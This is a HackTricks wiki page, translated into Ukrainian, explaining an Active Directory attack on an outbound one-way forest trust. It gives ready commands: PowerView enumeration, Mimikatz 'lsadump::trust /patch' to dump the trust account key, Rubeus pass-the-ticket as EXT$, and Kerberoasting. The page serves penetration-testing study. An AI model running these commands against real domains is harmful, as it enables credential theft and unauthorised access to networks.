# External Forest Domain - One-Way (Outbound)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

У цьому сценарії **ваш домен** **довіряє** деяким **привілеям** принципу з **інших доменів**.

## Перерахування

### Вихідна довіра
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Вразливість безпеки існує, коли встановлюється довірчі відносини між двома доменами, які тут позначені як домен **A** і домен **B**, де домен **B** розширює свою довіру до домену **A**. У цій конфігурації спеціальний обліковий запис створюється в домені **A** для домену **B**, який відіграє вирішальну роль у процесі аутентифікації між двома доменами. Цей обліковий запис, пов'язаний з доменом **B**, використовується для шифрування квитків для доступу до послуг між доменами.

Критичний аспект, який потрібно зрозуміти тут, полягає в тому, що пароль і хеш цього спеціального облікового запису можуть бути витягнуті з контролера домену в домені **A** за допомогою інструменту командного рядка. Команда для виконання цієї дії:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Ця екстракція можлива, оскільки обліковий запис, позначений знаком **$** після його імені, активний і належить до групи "Domain Users" домену **A**, тим самим успадковуючи дозволи, пов'язані з цією групою. Це дозволяє особам аутентифікуватися в домені **A** за допомогою облікових даних цього облікового запису.

**Увага:** Існує можливість використати цю ситуацію для отримання доступу до домену **A** як користувач, хоча з обмеженими дозволами. Проте, цей доступ є достатнім для проведення перерахунку в домені **A**.

У сценарії, де `ext.local` є довірчим доменом, а `root.local` є довіреним доменом, обліковий запис користувача з ім'ям `EXT$` буде створено в `root.local`. За допомогою специфічних інструментів можливо вивантажити ключі довіри Kerberos, розкриваючи облікові дані `EXT$` у `root.local`. Команда для досягнення цього виглядає так:
```bash
lsadump::trust /patch
```
Наступним кроком можна використати витягнутий ключ RC4 для автентифікації як `root.local\EXT$` в `root.local`, використовуючи іншу команду інструмента:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Цей крок аутентифікації відкриває можливість перераховувати та навіть експлуатувати сервіси в `root.local`, такі як виконання атаки Kerberoast для витягування облікових даних облікового запису служби за допомогою:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Збір пароля довіри в чистому вигляді

У попередньому потоці використовувався хеш довіри замість **пароля в чистому вигляді** (який також був **вивантажений за допомогою mimikatz**).

Пароль в чистому вигляді можна отримати, конвертуючи вихід \[ CLEAR \] з mimikatz з шістнадцяткового формату та видаляючи нульові байти ‘\x00’:

![](<../../.gitbook/assets/image (938).png>)

Іноді при створенні відносин довіри користувачеві потрібно ввести пароль для довіри. У цій демонстрації ключем є оригінальний пароль довіри, тому він читається людиною. Оскільки ключ змінюється (кожні 30 днів), пароль в чистому вигляді не буде читабельним для людини, але технічно все ще буде використовуваним.

Пароль в чистому вигляді можна використовувати для виконання звичайної аутентифікації як обліковий запис довіри, альтернативою запиту TGT за допомогою секретного ключа Kerberos облікового запису довіри. Тут запитуємо root.local з ext.local для членів Domain Admins:

![](<../../.gitbook/assets/image (792).png>)

## Посилання

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
